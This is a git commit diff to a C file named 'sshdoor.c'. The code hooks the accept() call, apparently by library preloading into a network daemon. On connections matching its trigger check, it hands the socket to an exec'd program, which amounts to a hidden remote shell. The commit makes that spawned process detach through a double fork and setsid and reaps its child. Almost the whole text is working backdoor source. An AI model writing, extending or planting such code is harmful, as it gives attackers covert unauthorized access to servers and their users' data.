e61851c62e94b2fab8cb3190f0162cd3b94e0e00
Maxime Augier <max@xolus.net>
2016-04-05 11:19:44 +0200

    Fork-setsid-fork to detach from controlling terminal and avoid zombies

--- sshdoor.c
+++ sshdoor.c
@@ -1,12 +1,13 @@
+#include <errno.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <sys/types.h>
 #include <sys/socket.h>
-#include <errno.h>
-#include <string.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 #define __USE_GNU
-
 #include <dlfcn.h>
 
 static const char trigger[] = "SSH-2.0-";
@@ -21,6 +22,7 @@ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
 
     for(;;) {
         int r = _accept(sockfd, addr, addrlen);
+        pid_t p;
 
         if (r <= 0 ||
             recv(r, buf, sizeof(buf), MSG_PEEK) != sizeof(buf) || 
@@ -28,13 +30,17 @@ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
                 return r;
         }        
 
-        if(!fork()) {
+        if(!(p = fork())) {
+            setsid();
+            if(fork()) exit(0);
+
             dup2(r, 0);
             dup2(r, 1);
             execvp(program[0], program);
         }
 
         close(r);
+        waitpid(p, NULL, 0);
 
     }
 
